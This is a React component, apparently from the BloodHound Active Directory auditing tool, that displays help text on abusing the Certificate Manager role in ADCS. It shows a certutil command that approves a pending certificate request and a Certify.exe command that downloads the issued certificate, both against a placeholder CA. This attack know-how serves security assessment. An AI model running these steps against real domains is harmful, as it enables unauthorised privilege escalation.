// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Typography } from '@mui/material';
import { FC } from 'react';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                An attacker can identify ADCS escalation opportunities where manager approval on the certificate
                template prevents direct abuse, but leverage the Certificate Manager role to approve the pending
                certificate request.
            </Typography>
            <Typography variant='body2'>Certificate requests can be approved with certutil:</Typography>
            <Typography component={'pre'}>
                {'certutil -config "caserver.fabricam.com\\Fabricam Issuing CA" -resubmit 12345'}
            </Typography>
            <Typography variant='body2'>Approved certificate can be downloaded using Certify:</Typography>
            <Typography component={'pre'}>
                {'Certify.exe download /ca:"caserver.fabricam.com\\Fabricam Issuing CA" /id:ReqID'}
            </Typography>
        </>
    );
};

export default Abuse;
